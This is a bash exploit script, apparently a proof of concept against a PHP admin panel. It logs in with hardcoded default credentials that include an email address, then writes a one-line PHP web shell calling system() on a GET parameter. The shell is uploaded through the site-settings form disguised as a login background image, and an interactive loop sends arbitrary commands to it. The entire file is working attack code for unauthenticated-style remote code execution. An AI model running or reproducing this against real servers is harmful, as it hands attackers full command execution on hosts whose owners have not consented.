#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP> <PORT>"
    exit 1
fi

TARGET="http://$1:$2"
LOGIN_URL="$TARGET/login.php"
UPLOAD_URL="$TARGET/manage_website.php"
USERNAME="mayuri.infospace@gmail.com"
PASSWORD="rootadmin"

COOKIE_FILE=$(mktemp)

urlencode() {
    local raw="$1"
    local encoded=""
    for (( i=0; i<${#raw}; i++ )); do
        local c="${raw:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    echo "$encoded"
}

echo "[*] Logging in to get session cookie..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_FILE" -X POST "$LOGIN_URL" -d "username=$USERNAME&password=$PASSWORD&login=")
echo "[*] Login response: $LOGIN_RESPONSE"

echo "[*] Creating malicious PHP script for remote code execution..."
echo "<?php system(\$_GET['code']); ?>" > root.php

echo -n "" > dummy.jpg

echo "[*] Uploading PHP script..."
UPLOAD_RESPONSE=$(curl -s -b "$COOKIE_FILE" -X POST "$UPLOAD_URL" \
  -F "title=Admin Panel by" \
  -F "footer=Admin Panel" \
  -F "short_title=9090908080" \
  -F "currency_code=India" \
  -F "currency_symbol=â‚¹" \
  -F "old_website_image=logo.jpg" \
  -F "website_image=@dummy.jpg;type=application/octet-stream" \
  -F "old_invoice_image=logo.jpg" \
  -F "invoice_image=@dummy.jpg;type=application/octet-stream" \
  -F "old_login_image=logo.png" \
  -F "login_image=@dummy.jpg;type=application/octet-stream" \
  -F "old_back_login_image=logo.jpg" \
  -F "back_login_image=@root.php;type=application/octet-stream" \
  -F "btn_web=")

echo "[*] Upload response: $UPLOAD_RESPONSE"

clear

while true; do
    read -p "Enter command to execute (or type 'exit' to quit): " CMD
    if [[ "$CMD" == "exit" ]]; then
        break
    fi
    COMMAND_RESPONSE=$(curl -s "$TARGET/assets/uploadImage/Logo/root.php?code=$(urlencode "$CMD")")
    echo "[*] Command response: $COMMAND_RESPONSE"
done

rm -f root.php dummy.jpg "$COOKIE_FILE"

echo "[*] PHP script uploaded. Access it here to run commands: $TARGET/assets/uploadImage/Logo/root.php?code=<command>"
